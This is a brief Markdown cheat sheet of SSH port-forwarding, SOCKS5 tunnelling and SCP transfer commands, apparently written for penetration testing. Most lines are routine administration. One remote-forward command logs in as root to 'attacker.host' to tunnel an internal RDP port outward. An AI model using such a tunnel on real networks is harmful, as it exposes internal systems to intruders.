#### port forward

*local port forward*

```ssh -L 8443:127.0.0.1:8443 user@remote.host```

```ssh -i id_rsa.key -L 6969:127.0.0.1:6969 user@remote.host```

*remote port forward*

```ssh -R 5901:127.0.0.1:5901 user@remote.host```

```ssh -l root -t -t -R 3389:10.10.10.1:3398 attacker.host```

-----


#### port forward SOCKS5

```ssh -D 5555 user@yourserver.com -p 5555```

-----

*Joining Tunnels Together*

```Machine A: ssh -D 5555 user@machineB -p5555```
```Machine B: ssh user@machineB -D 5555```
```Machine C: ssh user@machineB -L 5555:localhost:5555```


#### SCP transfers

*Local (file) to remote host specifying remote port*

```scp -P 1337 file.zip username@remotehost.com:/remote/dir/file.zip```

*Local (directory) to remote host using default port 22*

```scp /local/dir/ username@remotehost.com:/remote/dir/```

*Remote host A to remote host B*

```scp username@host-a.com:/host_a/dir/file.zip username@host-b.com:/host_b/dir/file.zip```

-----

